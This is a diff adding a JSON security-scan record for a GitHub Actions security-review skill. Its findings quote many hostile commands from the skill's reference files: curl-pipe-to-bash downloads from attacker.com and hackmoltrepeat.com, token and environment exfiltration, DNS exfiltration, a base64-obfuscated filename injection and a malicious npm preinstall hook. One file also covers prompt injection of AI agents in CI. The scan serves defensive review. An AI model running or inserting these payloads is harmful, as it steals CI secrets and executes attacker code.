@@ -1,0 +1,1472 @@
+{
+  "schema_version": "0.2",
+  "skill_id": "sentry/gha-security-review",
+  "source": {
+    "repo": "getsentry/skills",
+    "path": "skills/gha-security-review",
+    "revision": "d18b7aa8ba878354e5c348310230e652f7690f9c"
+  },
+  "review": {
+    "path": "catalog/reviews/sentry__gha-security-review.json",
+    "sha256": "16bfe4d0d521139f4992a7ca62784eb956a772d34fa98ca6cdf78ea4f58d5fa5"
+  },
+  "security_scan": {
+    "status": "verified",
+    "risk": "medium",
+    "capabilities": {
+      "shell": true,
+      "network": true,
+      "credentials": true,
+      "dynamic_execution": false,
+      "package_install": true,
+      "filesystem_write": true,
+      "encoded_content": true
+    },
+    "findings": [
+      {
+        "type": "network-access",
+        "line": 3,
+        "evidence": "http://",
+        "context": "                        http://www.apache.org/licenses/",
+        "file": "LICENSE.txt"
+      },
+      {
+        "type": "network-access",
+        "line": 184,
+        "evidence": "http://",
+        "context": "       http://www.apache.org/licenses/LICENSE-2.0",
+        "file": "LICENSE.txt"
+      },
+      {
+        "type": "network-access",
+        "line": 72,
+        "evidence": "curl",
+        "context": "\t@curl -sSfL https://attacker.com/exfil?key=$(ANTHROPIC_API_KEY) > /dev/null 2>&1",
+        "file": "references/ai-prompt-injection-via-ci.md"
+      },
+      {
+        "type": "network-access",
+        "line": 72,
+        "evidence": "https://",
+        "context": "\t@curl -sSfL https://attacker.com/exfil?key=$(ANTHROPIC_API_KEY) > /dev/null 2>&1",
+        "file": "references/ai-prompt-injection-via-ci.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 92,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/ai-prompt-injection-via-ci.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 143,
+        "evidence": "Bash",
+        "context": "    allowed_tools: \"Read,Grep,Glob\"  # No Bash, no Write",
+        "file": "references/ai-prompt-injection-via-ci.md"
+      },
+      {
+        "type": "filesystem-write",
+        "line": 153,
+        "evidence": "remove",
+        "context": "# SAFE: Only allow specific trusted users or remove entirely",
+        "file": "references/ai-prompt-injection-via-ci.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 172,
+        "evidence": "secret",
+        "context": "IMPACT: [Unauthorized commits, fake approvals, secret leakage]",
+        "file": "references/ai-prompt-injection-via-ci.md"
+      },
+      {
+        "type": "network-access",
+        "line": 180,
+        "evidence": "https://",
+        "context": "- [HackerBot Claw — ambient-code/platform AI prompt injection attempt](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)",
+        "file": "references/ai-prompt-injection-via-ci.md"
+      },
+      {
+        "type": "network-access",
+        "line": 181,
+        "evidence": "https://",
+        "context": "- [Anthropic Claude Code Action — Security considerations](https://github.com/anthropics/claude-code-action)",
+        "file": "references/ai-prompt-injection-via-ci.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 23,
+        "evidence": "sh",
+        "context": "      - run: ./deploy.sh",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 48,
+        "evidence": "sh",
+        "context": "      - run: ./version.sh -u -n",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "network-access",
+        "line": 51,
+        "evidence": "curl",
+        "context": "**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `curl -sSfL https://attacker.com/steal | bash` at the top, then commented `/version minor` to trigger execution. No `aut",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "network-access",
+        "line": 51,
+        "evidence": "https://",
+        "context": "**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `curl -sSfL https://attacker.com/steal | bash` at the top, then commented `/version minor` to trigger execution. No `aut",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 51,
+        "evidence": "sh",
+        "context": "**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `curl -sSfL https://attacker.com/steal | bash` at the top, then commented `/version minor` to trigger execution. No `aut",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 51,
+        "evidence": "bash",
+        "context": "**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `curl -sSfL https://attacker.com/steal | bash` at the top, then commented `/version minor` to trigger execution. No `aut",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 69,
+        "evidence": "base64",
+        "context": "/greet\"; curl https://attacker.com/$(env | base64) #",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "network-access",
+        "line": 69,
+        "evidence": "curl",
+        "context": "/greet\"; curl https://attacker.com/$(env | base64) #",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "network-access",
+        "line": 69,
+        "evidence": "https://",
+        "context": "/greet\"; curl https://attacker.com/$(env | base64) #",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 95,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 131,
+        "evidence": "sh",
+        "context": "      - run: ./deploy.sh",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 167,
+        "evidence": "sh",
+        "context": "            ./deploy.sh \"$ARGS\"",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 185,
+        "evidence": "secret",
+        "context": "IMPACT: [RCE, deployment trigger, secret access, etc.]",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "network-access",
+        "line": 192,
+        "evidence": "https://",
+        "context": "- [GitHub Docs: Events that trigger workflows — issue_comment](https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#issue_comment)",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "network-access",
+        "line": 193,
+        "evidence": "https://",
+        "context": "- [HackerBot Claw — project-akri /version command exploit](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)",
+        "file": "references/comment-triggered-commands.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 1,
+        "evidence": "Credential",
+        "context": "# Credential Escalation",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 9,
+        "evidence": "Credential",
+        "context": "## Credential Types and Blast Radius",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 11,
+        "evidence": "Credential",
+        "context": "| Credential | Default Scope | Blast Radius if Stolen |",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 15,
+        "evidence": "Access Token",
+        "context": "| Personal Access Token (classic) | All repos the user can access | Full account compromise across repos |",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 39,
+        "evidence": "sh",
+        "context": "      - run: ./scripts/auto-format.sh  # Fork code has access to PAT",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "filesystem-write",
+        "line": 44,
+        "evidence": "Delete",
+        "context": "- Delete all GitHub Releases (versions 0.27.0 through 0.69.1)",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "package-install",
+        "line": 60,
+        "evidence": "npm install",
+        "context": "      - run: npm install  # Fork's package.json can steal GITHUB_TOKEN",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 86,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 105,
+        "evidence": "Credential",
+        "context": "## The Fix: Minimal Permissions and Credential Isolation",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 190,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "network-access",
+        "line": 192,
+        "evidence": "curl",
+        "context": "curl -d \"token=$GITHUB_TOKEN\" https://attacker.com/collect",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "network-access",
+        "line": 192,
+        "evidence": "https://",
+        "context": "curl -d \"token=$GITHUB_TOKEN\" https://attacker.com/collect",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 195,
+        "evidence": "base64",
+        "context": "dig $(echo $GITHUB_TOKEN | base64).attacker.com",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 210,
+        "evidence": "Credential",
+        "context": "ATTACK: Credential Escalation via [vector]",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 212,
+        "evidence": "CREDENTIAL",
+        "context": "CREDENTIAL: [Which credential is accessible — PAT, GITHUB_TOKEN, cloud key]",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 212,
+        "evidence": "credential",
+        "context": "CREDENTIAL: [Which credential is accessible — PAT, GITHUB_TOKEN, cloud key]",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 213,
+        "evidence": "credential",
+        "context": "SCOPE: [What the credential can do — write to repo, publish packages, etc.]",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 214,
+        "evidence": "credential",
+        "context": "EXFILTRATION: [How the attacker extracts the credential]",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 215,
+        "evidence": "credential",
+        "context": "POST-EXPLOITATION: [What attacker does with the credential]",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "network-access",
+        "line": 223,
+        "evidence": "https://",
+        "context": "- [GitHub Docs: Automatic token authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "network-access",
+        "line": 224,
+        "evidence": "https://",
+        "context": "- [GitHub Docs: Using fine-grained PATs](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens)",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "network-access",
+        "line": 225,
+        "evidence": "https://",
+        "context": "- [HackerBot Claw — trivy PAT theft and full repo compromise](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)",
+        "file": "references/credential-escalation.md"
+      },
+      {
+        "type": "network-access",
+        "line": 18,
+        "evidence": "curl",
+        "context": "\"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "network-access",
+        "line": 18,
+        "evidence": "https://",
+        "context": "\"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 22,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "network-access",
+        "line": 23,
+        "evidence": "curl",
+        "context": "echo \"PR Title: \"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #\"",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "network-access",
+        "line": 23,
+        "evidence": "https://",
+        "context": "echo \"PR Title: \"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #\"",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "network-access",
+        "line": 26,
+        "evidence": "curl",
+        "context": "The shell executes `echo`, then `curl`, then ignores the rest as a comment.",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "network-access",
+        "line": 43,
+        "evidence": "curl",
+        "context": "dev$({curl,-sSfL,attacker.com/steal}${IFS}|${IFS}bash)",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 43,
+        "evidence": "bash",
+        "context": "dev$({curl,-sSfL,attacker.com/steal}${IFS}|${IFS}bash)",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "network-access",
+        "line": 48,
+        "evidence": "curl",
+        "context": "- `$({curl,-sSfL,attacker.com/steal})` — brace expansion + command substitution",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 49,
+        "evidence": "bash",
+        "context": "- The `|${IFS}bash` pipes the download to bash",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 49,
+        "evidence": "bash",
+        "context": "- The `|${IFS}bash` pipes the download to bash",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 67,
+        "evidence": "base64",
+        "context": "docs/$(echo${IFS}Y3VybCAtc1NmTCBhdHRhY2tlci5jb20vc3RlYWw=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 67,
+        "evidence": "bash",
+        "context": "docs/$(echo${IFS}Y3VybCAtc1NmTCBhdHRhY2tlci5jb20vc3RlYWw=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 70,
+        "evidence": "base64",
+        "context": "The base64 decodes to `curl -sSfL attacker.com/steal`, executed via command substitution in the filename.",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "network-access",
+        "line": 70,
+        "evidence": "curl",
+        "context": "The base64 decodes to `curl -sSfL attacker.com/steal`, executed via command substitution in the filename.",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "network-access",
+        "line": 87,
+        "evidence": "curl",
+        "context": "$(curl -sSfL attacker.com/steal | bash)",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 87,
+        "evidence": "bash",
+        "context": "$(curl -sSfL attacker.com/steal | bash)",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 138,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "network-access",
+        "line": 284,
+        "evidence": "https://",
+        "context": "- [GitHub Docs: Security hardening — Expression injection](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "network-access",
+        "line": 285,
+        "evidence": "https://",
+        "context": "- [HackerBot Claw — branch name and filename injection attacks](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)",
+        "file": "references/expression-injection.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 77,
+        "evidence": "Secret",
+        "context": "## Secret Management",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 79,
+        "evidence": "Secret",
+        "context": "### Secret Exposure Vectors",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 84,
+        "evidence": "Secret",
+        "context": "# VULNERABLE: Secret value ends up in shell where injection can capture it",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 86,
+        "evidence": "API_KEY",
+        "context": "  API_KEY: ${{ secrets.API_KEY }}",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 86,
+        "evidence": "API_KEY",
+        "context": "  API_KEY: ${{ secrets.API_KEY }}",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 89,
+        "evidence": "API_KEY",
+        "context": "    # Expression injection here can access $API_KEY from environment",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 97,
+        "evidence": "API_KEY",
+        "context": "    ENCODED=$(echo \"${{ secrets.API_KEY }}\" | base64)",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 97,
+        "evidence": "base64",
+        "context": "    ENCODED=$(echo \"${{ secrets.API_KEY }}\" | base64)",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 98,
+        "evidence": "secret",
+        "context": "    echo \"Encoded key: $ENCODED\"  # GitHub only masks the original secret value",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 101,
+        "evidence": "secret",
+        "context": "GitHub Actions automatically masks secret values in logs, but **derived values** (base64-encoded, truncated, transformed) are NOT masked.",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 101,
+        "evidence": "base64",
+        "context": "GitHub Actions automatically masks secret values in logs, but **derived values** (base64-encoded, truncated, transformed) are NOT masked.",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 109,
+        "evidence": "secret",
+        "context": "    # If this file ends up in an artifact, the secret is exposed",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 128,
+        "evidence": "sh",
+        "context": "      - run: ./build.sh  # Fork code can read all secrets via ${{ secrets.* }}",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 131,
+        "evidence": "secret",
+        "context": "**Important:** Secrets are available to `pull_request_target` workflows. Combined with fork checkout, this exposes every secret to attacker code.",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 137,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 147,
+        "evidence": "secret",
+        "context": "# Find secret usage",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 229,
+        "evidence": "Secret",
+        "context": "### Secret Scoping with Environments",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "network-access",
+        "line": 263,
+        "evidence": "https://",
+        "context": "- [GitHub Docs: Permissions for GITHUB_TOKEN](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "network-access",
+        "line": 264,
+        "evidence": "https://",
+        "context": "- [GitHub Docs: Using OIDC for cloud deployments](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "network-access",
+        "line": 265,
+        "evidence": "https://",
+        "context": "- [GitHub Blog: Security hardening — Permissions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)",
+        "file": "references/permissions-and-secrets.md"
+      },
+      {
+        "type": "package-install",
+        "line": 24,
+        "evidence": "npm install",
+        "context": "      - run: npm install && npm test  # Executes attacker's code",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 47,
+        "evidence": "bash",
+        "context": "    _ = exec.Command(\"bash\", \"-c\",",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "network-access",
+        "line": 48,
+        "evidence": "curl",
+        "context": "        `curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \\",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "network-access",
+        "line": 50,
+        "evidence": "https://",
+        "context": "        https://attacker.com/collect`).Run()",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "network-access",
+        "line": 61,
+        "evidence": "curl",
+        "context": "    \"preinstall\": \"curl -sSfL https://attacker.com/steal | bash\"",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "network-access",
+        "line": 61,
+        "evidence": "https://",
+        "context": "    \"preinstall\": \"curl -sSfL https://attacker.com/steal | bash\"",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 61,
+        "evidence": "bash",
+        "context": "    \"preinstall\": \"curl -sSfL https://attacker.com/steal | bash\"",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "package-install",
+        "line": 66,
+        "evidence": "npm install",
+        "context": "Any `npm install`, `npm ci`, or `npm test` (which often installs first) will execute these scripts.",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "network-access",
+        "line": 77,
+        "evidence": "curl",
+        "context": "        os.system(f\"curl -d token=$GITHUB_TOKEN https://attacker.com/collect\")",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "network-access",
+        "line": 77,
+        "evidence": "https://",
+        "context": "        os.system(f\"curl -d token=$GITHUB_TOKEN https://attacker.com/collect\")",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "network-access",
+        "line": 93,
+        "evidence": "curl",
+        "context": "    - run: curl -sSfL https://attacker.com/steal | bash",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "network-access",
+        "line": 93,
+        "evidence": "https://",
+        "context": "    - run: curl -sSfL https://attacker.com/steal | bash",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 93,
+        "evidence": "bash",
+        "context": "    - run: curl -sSfL https://attacker.com/steal | bash",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 94,
+        "evidence": "bash",
+        "context": "      shell: bash",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 96,
+        "evidence": "bash",
+        "context": "      shell: bash",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "filesystem-write",
+        "line": 99,
+        "evidence": "delete",
+        "context": "**Real-world:** Used against trivy (25k+ stars). The attacker modified `.github/actions/setup-go/action.yaml` to inject a payload. The \"Set up Go\" step took 5+ minutes (vs. normal seconds), and the stolen PAT was used to rename the repo, de",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "network-access",
+        "line": 109,
+        "evidence": "curl",
+        "context": "\t@curl -sSfL https://attacker.com/steal | bash",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "network-access",
+        "line": 109,
+        "evidence": "https://",
+        "context": "\t@curl -sSfL https://attacker.com/steal | bash",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 109,
+        "evidence": "bash",
+        "context": "\t@curl -sSfL https://attacker.com/steal | bash",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 117,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "package-install",
+        "line": 148,
+        "evidence": "npm install",
+        "context": "      - run: npm install && npm test",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "network-access",
+        "line": 209,
+        "evidence": "https://",
+        "context": "- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure (pwn requests)](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "network-access",
+        "line": 210,
+        "evidence": "https://",
+        "context": "- [HackerBot Claw campaign — awesome-go and trivy attacks](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)",
+        "file": "references/pwn-request.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 19,
+        "evidence": "Base64",
+        "context": "| Mar 2, 05:57 | RustPython/RustPython | — | Base64 branch injection | Partial execution |",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 47,
+        "evidence": "bash",
+        "context": "    _ = exec.Command(\"bash\", \"-c\",",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 48,
+        "evidence": "curl",
+        "context": "        `curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \\",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 50,
+        "evidence": "https://",
+        "context": "        https://recv.hackmoltrepeat.com/ && \\",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 51,
+        "evidence": "curl",
+        "context": "        curl -sSfL https://hackmoltrepeat.com/molt | bash`).Run()",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 51,
+        "evidence": "https://",
+        "context": "        curl -sSfL https://hackmoltrepeat.com/molt | bash`).Run()",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 51,
+        "evidence": "bash",
+        "context": "        curl -sSfL https://hackmoltrepeat.com/molt | bash`).Run()",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "credential-access",
+        "line": 69,
+        "evidence": "Credential",
+        "context": "**Category:** Credential Escalation",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 87,
+        "evidence": "bash",
+        "context": "```bash",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 88,
+        "evidence": "curl",
+        "context": "curl -sSfL https://hackmoltrepeat.com/molt | bash",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 88,
+        "evidence": "https://",
+        "context": "curl -sSfL https://hackmoltrepeat.com/molt | bash",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 88,
+        "evidence": "bash",
+        "context": "curl -sSfL https://hackmoltrepeat.com/molt | bash",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 104,
+        "evidence": "curl",
+        "context": "- `curl` command visible in build logs",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 130,
+        "evidence": "curl",
+        "context": "dev$({curl,-sSfL,hackmoltrepeat.com/molt}${IFS}|${IFS}bash)",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 130,
+        "evidence": "bash",
+        "context": "dev$({curl,-sSfL,hackmoltrepeat.com/molt}${IFS}|${IFS}bash)",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 135,
+        "evidence": "curl",
+        "context": "- `$({curl,-sSfL,...})` is brace expansion + command substitution",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 136,
+        "evidence": "bash",
+        "context": "- Pipe to `bash` executes downloaded script",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 141,
+        "evidence": "curl",
+        "context": "- Downstream workflow file corrupted with curl output instead of branch name",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 156,
+        "evidence": "Base64",
+        "context": "Base64-encoded shell commands embedded in filenames:",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 159,
+        "evidence": "base64",
+        "context": "documentation/rules/$(echo${IFS}Y3VybCAtc1NmTCBoYWNr...${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 159,
+        "evidence": "bash",
+        "context": "documentation/rules/$(echo${IFS}Y3VybCAtc1NmTCBoYWNr...${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 166,
+        "evidence": "base64",
+        "context": "DataDog deployed emergency fixes within 9 hours (PR #9, Feb 27). Build logs showed base64 decoding errors with 2.5-minute execution gap, confirming shell injection fired.",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 227,
+        "evidence": "sh",
+        "context": "      - run: ./version.sh -u -n",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 232,
+        "evidence": "sh",
+        "context": "1. Attacker opened PR modifying `version.sh` to inject payload at the top:",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 233,
+        "evidence": "bash",
+        "context": "   ```bash",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 234,
+        "evidence": "bash",
+        "context": "   #!/usr/bin/env bash",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 235,
+        "evidence": "curl",
+        "context": "   curl -sSfL https://hackmoltrepeat.com/molt | bash",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 235,
+        "evidence": "https://",
+        "context": "   curl -sSfL https://hackmoltrepeat.com/molt | bash",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 235,
+        "evidence": "bash",
+        "context": "   curl -sSfL https://hackmoltrepeat.com/molt | bash",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "shell-execution",
+        "line": 240,
+        "evidence": "sh",
+        "context": "4. Fork's `version.sh` executed with repo permissions",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 253,
+        "evidence": "Base64",
+        "context": "## Attack 7: RustPython — Base64 Branch Name Injection",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 260,
+        "evidence": "base64",
+        "context": "Similar to the Microsoft attack but using base64-encoded payload in the branch name. The attack achieved partial execution before being detected.",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 264,
+        "evidence": "Base64",
+        "context": "Base64 encoding is a common evasion technique for branch name and filename injection. The decoded payload is the same `curl | bash` pattern.",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "encoded-content",
+        "line": 264,
+        "evidence": "decoded payload",
+        "context": "Base64 encoding is a common evasion technique for branch name and filename injection. The decoded payload is the same `curl | bash` pattern.",
+        "file": "references/real-world-attacks.md"
+      },
+      {
+        "type": "network-access",
+        "line": 264,
+        "evidence": "curl",
